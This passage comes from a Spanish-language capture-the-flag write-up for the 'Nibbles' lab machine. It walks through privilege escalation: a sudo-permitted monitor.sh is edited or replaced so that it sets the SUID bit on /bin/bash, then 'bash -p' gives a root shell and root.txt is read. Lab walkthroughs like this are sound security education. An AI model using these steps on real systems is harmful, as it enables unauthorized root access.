-rwxr-xr-x 1 root root 1037528 May 16  2017 /bin/bash
```

Bien, esta vez, vamos a entrar al archivo y a agregar lo siguiente:
```bash
chmod u+s /bin/bash
```

Ejecutamos el script con el comando **sudo**:
```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo ./monitor.sh
/home/nibbler/personal/stuff/monitor.sh: 26: /home/nibbler/personal/stuff/monitor.sh: [[: not found
/home/nibbler/personal/stuff/monitor.sh: 36: /home/nibbler/personal/stuff/monitor.sh: [[: not found
/home/nibbler/personal/stuff/monitor.sh: 43: /home/nibbler/personal/stuff/monitor.sh: [[: not found
nibbler@Nibbles:/home/nibbler/personal/stuff$
```

Comprobamos otra vez los permisos de la **Bash**:
```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -la /bin/bash 
-rwsr-xr-x 1 root root 1037528 May 16  2017 /bin/bash
```

Y ahora si, nos metemos a la **Bash**:
```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ bash -p
bash-4.3# whoami 
root
```

#### Forma 3: Suplantación de Archivo .sh {#PostForma3}

Primero, tratemos de crear las dos carpetas que deberían crearse con el descomprimido, si nos deja, vamos bien y si no, lo intentamos con las formas anteriores:
```bash
nibbler@Nibbles:/home/nibbler$ mkdir -p /home/nibbler/personal/stuff
```

Si nos dejó, vamos a meternos hasta **stuff**:
```bash
nibbler@Nibbles:/home/nibbler$ cd personal/stuff/
```

Ahí vamos a crear el archivo **monitor.sh** y vamos a poner el comando para cambiar los permisos de la **Bash**:
```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ nano monitor.sh
chmod u+s /bin/bash
```

Guardamos, salimos y le damos permisos de ejecución:
```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ chmod +x monitor.sh
```

Comprobamos los permisos de la **Bash**:
```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -la /bin/bash 
-rwxr-xr-x 1 root root 1037528 May 16  2017 /bin/bash
```

Ejecutamos el script con el comando **sudo**:
```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo ./monitor.sh
```

Y ya deberían estar cambiados los permisos de la **Bash**:
```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -la /bin/bash 
-rwsr-xr-x 1 root root 1037528 May 16  2017 /bin/bash
```

Nos metemos a la **Bash** y buscamos las flags:
```bash
-rwsr-xr-x 1 root root 1037528 May 16  2017 /bin/bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ bash -p
bash-4.3# whoami
root
bash-4.3# cd /root
bash-4.3# cat root.txt
```
¡Y listo! Ya completamos esta máquina.
